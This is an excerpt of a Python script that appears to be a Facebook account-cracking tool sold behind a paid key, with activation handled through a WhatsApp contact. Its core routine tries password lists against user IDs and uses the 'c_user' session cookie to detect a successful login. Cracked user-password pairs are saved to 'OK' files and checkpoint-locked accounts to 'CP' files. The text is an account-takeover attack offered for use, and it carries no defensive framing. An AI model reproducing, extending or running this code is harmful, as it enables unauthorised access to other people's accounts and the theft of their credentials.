...
def main_apv():
    ...
    print (logo)
    try:
        key1 = open('/sdcard/ahsam.txt', 'r').read()
    except IOError:
        os.system('clear')
        print (logo)
        ...
        time.sleep(3.5)
        os.system('xdg-open https://wa.me/+923411471937?text=HELLO%20aAHSAM,%20PLEASE%20APPROVED%20MY%20KEY%20TO%20PREMIUM %20%20MY%20%20KEY%20%20:%20')

    r1 = requests.get('https://github.com/MR-AUH404/paid_key/blame/main/aprooval.txt').text
    if key1 in r1:
        main()
    else:
        os.system('clear')
        ...
        print ('_____________________________________________________')
        time.sleep(3.5)
        os.system('xdg-open https://wa.me/+923411471937?text=HELLO%20AHSAM,%20PLEASE%20APPROVED%20MY%20KEY%20TO%20PREMIUM✓✓%20%20%20%20%20MY%20%20KEY%20%20:%20')
        
def hasil(OK,cp):
    if not len(OK) != 0:
        pass
    if len(cp) != 0:
        print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAUH_OK.txt' % (H, P, str(len(ok))))
        print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mAUH_CP.txt' % (H, P, str(len(cp))))
        input("\x1b[1;97mPress enter to back AUH Menu ")
        ahsam()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AUH] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MR-AUH-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MR-AUH_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MR-AUH-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MR-AUH_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def contact ():
   os.system('clear')
   os.system('xdg-open https://wa.me/+923411471937') 
main_apv()
